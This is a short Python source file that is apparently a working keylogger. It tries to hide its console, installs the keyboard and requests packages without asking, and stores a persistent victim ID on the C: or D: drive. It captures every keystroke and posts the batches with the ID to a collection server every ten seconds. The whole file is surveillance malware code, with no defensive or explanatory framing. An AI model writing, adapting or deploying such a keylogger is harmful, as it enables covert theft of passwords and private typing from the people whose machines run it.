from datetime import datetime
import time
import threading
import pip
import os
SERVER = "http://localhost:8080"
deltaTime = 1
id = -1

os.system('hide console')

try:
    import keyboard
except:
    pip.main(['install','keyboard'])
    import keyboard

try:
    import requests as r
except:
    pip.main(['install','requests'])
    import requests as r


try:
    with open("C:\comid.id", "r") as f:
        id = f.read()
except:
    try:
        with open("D:\comid.id", "r") as f:
            id = f.read()
    except:
        id = str(datetime.now()).replace(" ","").replace('.','').replace('-','').replace(':','')
      
        try:
            with open("C:\comid.id", "w") as f:
                f.write(id)
        except:
            with open("D:\comid.id", "w") as f:
                f.write(id)

print(id)   
allKeys = ''
body={
    "id":id,
    "keys":'null'
}
def SendToServer():
    global allKeys
    global body
    while True:
        try:
            time.sleep(10)
            sendKey = allKeys
            allKeys = ""
            if (sendKey == ""): sendKey = 'null'
            body['keys'] = sendKey
            r.post('http://localhost:8080/send',json=body)
        except KeyboardInterrupt:
            break

threading.Thread(target=SendToServer).start()
while True:
    key = keyboard.read_event()
    keyboard.unhook_all()
    if key.event_type == "down": 
        allKeys+=key.name+'\n'
        